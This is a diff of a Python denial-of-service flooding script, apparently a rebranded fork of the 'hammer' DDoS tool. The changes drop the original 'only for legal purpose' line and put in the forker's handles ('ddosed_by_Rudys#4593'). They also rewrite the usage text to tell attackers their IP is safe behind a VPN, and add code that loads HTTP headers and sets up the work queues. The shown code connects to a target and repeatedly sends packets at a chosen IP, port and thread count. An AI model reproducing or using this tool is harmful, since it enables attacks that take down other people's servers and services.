@@ -1,9 +1,7 @@
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
 
-# python 3.3.2+ Dos Script v.1
-# by ROODy
-# only for legal purpose
+# python 3.3.2+ DoS by nok#1337
 
 
 from queue import Queue
@@ -49,13 +47,13 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m Attacking server... \033[0m")
+				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m ddosed_by_Rudys#4593 \033[0m")
 			else:
 				s.shutdown(1)
-				print("\033[91mshut<->down\033[0m")
+				print("\033[91mTools_by_Rudys#4593\033[0m")
 			time.sleep(.1)
 	except socket.error as e:
-		print("\033[91mno connection! server maybe down\033[0m")
+		print("\033[91mServer down.\033[0m")
 		#print("\033[91m",e,"\033[0m")
 		time.sleep(.1)
 
@@ -75,13 +73,9 @@ def dos2():
 
 
 def usage():
-	print (''' \033[92m	DDoS v1.0 by Rudys#4593 http://www.canyalcin.com/
-	Your ip is visible. \n
-	usage : python3 hammer.py [-s] [-p] [-t]
-	-h : help
-	-s : server ip
-	-p : port default 80
-	-t : turbo default 135 \033[0m''')
+	print (''' \033[92m	DDoS Tools By Rudys#4593 
+	Your IP is safe! , if you want more safe use VPn. \n
+	usage : python RDOS.py -s ip -p 80 -t 135 \033[0m''')
 	sys.exit()
 
 
@@ -115,13 +109,21 @@ def get_parameters():
 
 
 # reading headers
+global data
+headers = open("headers.txt", "r")
+data = headers.read()
+headers.close()
+#task queue are q,w
+q = Queue()
+w = Queue()
+
 
 if __name__ == '__main__':
 	if len(sys.argv) < 2:
 		usage()
 	get_parameters()
 	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
-	print("\033[94mPlease wait...\033[0m")
+	print("\033[94mDoing attack...\033[0m")
 	user_agent()
 	my_bots()
 	time.sleep(5)
